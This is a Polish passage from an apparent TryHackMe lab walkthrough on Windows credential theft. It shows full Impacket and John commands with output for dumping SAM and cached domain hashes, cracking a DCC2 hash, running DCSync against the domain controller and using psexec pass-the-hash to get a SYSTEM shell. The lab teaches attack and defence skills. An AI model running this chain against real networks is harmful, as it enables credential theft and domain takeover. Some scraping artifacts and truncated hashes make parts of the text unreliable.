Ta technika jest cenna, ponieważ nie wymaga przesyłania plików binarnych ani bezpośredniego dostępu do poufnych plików. Zamiast tego wykorzystuje wbudowaną funkcjonalność systemu Windows do dyskretnego i zdalnego pobierania danych uwierzytelniających. W poprzednim zadaniu udało nam się uzyskać dane uwierzytelniające niektórych użytkowników domeny, ale nie żadnych administratorów domeny.

Zrzucanie skrótów za pomocą administratora lokalnego
Możemy uruchomić następujące polecenie z poziomu AttackBox:

Terminal
user@tryhackme$ secretsdump.py WRK/Administrator:N3w34829DJdd?1@10.220.10.20 -output local_dump
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xfa0661c3eee8696eeb436f2bafa060e7
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:78165db7b3687203aa6eb88332504bda:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:95f2822ae7e725c8e30b2b31f66c1b86:::
LocalUser1:1000:aad3b435b51404eeaad3b435b51404ee:dae57d78fec919471799ce0fae8236b9:::
ElonTusk:1001:aad3b435b51404eeaad3b435b51404ee:c2546047cca718bd2ba7538e5bfcb4b2:::
[*] Dumping cached domain logon information (domain/username:hash)
TRYHACKME.LOC/Administrator:$DCC2$10240
TRYHACKME.LOC/raoulduke:$DCC2$10240
TRYHACKME.LOC/svc-app:$DCC2$10240
TRYHACKME.LOC/drgonzo:$DCC2$10240
...
WRK/Administrator:N3w34829DJdd?1@10.220.10.20:Format jestHost/User:Password@Target_IP
-output dc_dump:Dzięki temu możemy zapisać dane wyjściowe do pliku o nazwie dc_dump.
Interesują nas skróty haseł MS-Cache v2 (znane również jako DCC2) . Skróty DCC2 to buforowane dane uwierzytelniające domeny przechowywane lokalnie na komputerach z systemem Windows. Umożliwiają one użytkownikom logowanie się do konta domeny w trybie offline, na przykład na laptopie, który nie jest aktualnie podłączony do sieci domeny. Jako administrator lokalny możemy zrzucić skróty administratora domeny, jeśli wcześniej logował się on do systemu.

W przeciwieństwie do skrótów NTLM, skrótów DCC2 nie można używać do ataków typu pass-the-hash. Można je jednak wykorzystać do łamania haseł offline. Dodajmy skrót drgonzo do pliku dc2_hash.txt , aby go złamać:

Terminal
user@tryhackme$ cat dc2_hash.txt 
$DCC2$10240
Łamanie haszy
Możemy użyć Hashcata lub Johna do złamania haszy odzyskanych dzięki secretsdump.py. Jeśli nie znasz tych dwóch narzędzi, polecamy ten pokój.

Możemy uruchomić następujące polecenie Johna z naszego AttackBox:

Terminal
user@tryhackme$ john --format=mscash2 dc2_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hashes with 1 different salt (mscash2, MS Cache Hash 2 (DCC2) [PBKDF2-SHA1 256/256 AVX2 8x])
Will run 2 OpenMP threads
--format=mscash2:Podajemy format skrótu, który chcemy złamać, DCC2 .
dc2_hashes.txt:To są skróty, które chcemy, aby John spróbował złamać.
--wordlist=/usr/share/wordlists/rockyou.txt: Jako listę haseł wykorzystamy plik rockyou.txt .
Po kilku sekundach znajdujemy hasło drgonzo . Jednak, chociaż możemy połączyć się z kontrolerem domeny za pomocą protokołu RDP z danymi drgonzo , nie możemy odczytać flagi na pulpicie administratora domeny.

Zrzucanie haszy za pomocą administratora domeny
Mając teraz dane uwierzytelniające administratora domeny, możemy ponownie uruchomić secretsdump.py, ale tym razem kierując go do kontrolera domeny:

Terminal
user@tryhackme$ secretsdump.py TRYHACKME/drgonzo:*******@10.220.10.10 -just-dc -output dc_dump
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:*****************:*******************:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:399b08294203eeafef6c1ec6d5747127:::
raoulduke:1609:aad3b435b51404eeaad3b435b51404ee:3a21525d05796b78061c988f2d0233b4:::
svc-app:1610:aad3b435b51404eeaad3b435b51404ee:df35591a02f03fc5a79e25587a3fdf1e:::
drgonzo:1611:aad3b435b51404eeaad3b435b51404ee:e2c947a3cce1634343ac1cfaa3ca506d:::
tryhackme.loc\HunterThompson:1613:aad3b435b51404eeaad3b435b51404ee:980bd1bf7be20353137426c2aaef4fef:::
DC$:1008:aad3b435b51404eeaad3b435b51404ee:45d8bd6b6b998ea5ffabc8376202a5df:::
WRK$:1111:aad3b435b51404eeaad3b435b51404ee:74393746b4a3eb655306ded74e0865ae:::
[*] Kerberos keys grabbed
[*] Cleaning up... 
-just-dcPomija lokalne zrzucanie gałęzi SAM/LSA i wykonuje tylko ekstrakcję DRSUAPI („DCSync”) pliku NTDS.dit domeny . Symuluje to, jak wygląda drugaDCZrobilibyśmy to, aby zsynchronizować dane uwierzytelniające, ale nadużywamy tego protokołu, używając uprawnień administratora domeny. W praktyce oznacza to, że otrzymujemy: skróty haseł NTLM dla wszystkich użytkowników domeny oraz klucze Kerberos (jeśli są dostępne).

Oto format danych wyjściowych: nazwa użytkownika:RID:LM hash:NT hash:::

Po uzyskaniu skrótu NTLM administratora domeny nie musimy już znać hasła w postaci zwykłego tekstu. Możemy uwierzytelnić się bezpośrednio jako ten użytkownik dzięki obsłudze uwierzytelniania PtH (pass-the-hash) w systemie Windows .

Możemy użyć psexec , aby uzyskać powłokę na kontrolerze domeny:

Terminal
user@tryhackme$ psexec.py 'TRYHACKME/Administrator@10.220.10.10' -hashes :****************

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Requesting shares on 10.220.10.10.....
[*] Found writable share ADMIN$
[*] Uploading file zicHlJDd.exe
[*] Opening SVCManager on 10.220.10.10.....
[*] Creating service inPh on 10.220.10.10.....
[*] Starting service inPh.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
C:\Windows\system32> whoami
nt authority\system
I tak po prostu przejęliśmy domenę, bez potrzeby stosowania exploitów. Zbierając i ponownie wykorzystując dane uwierzytelniające, wspięliśmy się po szczeblach kariery na poziom administratora domeny.

W tym pomieszczeniu nauczyliśmy się, jak wyszukiwać i wyodrębniać dane uwierzytelniające z różnych części systemu Windows iOGŁOSZENIEŚrodowisko. Od pamięci ( LSASS ), przez gałęzie rejestru ( SAM, SYSTEM, BEZPIECZEŃSTWO ), po zbuforowane sekrety – dane uwierzytelniające są wszędzie, jeśli wiesz, gdzie ich szukać. Zaczęliśmy od lokalnego dostępu administratora i użyliśmy narzędzi takich jak mimikatz i secretsdump.py , aby odkryć hasła, skróty i tokeny. Następnie wykorzystaliśmy te dane uwierzytelniające, aby pójść dalej, ostatecznie uzyskując dostęp administratora domeny.
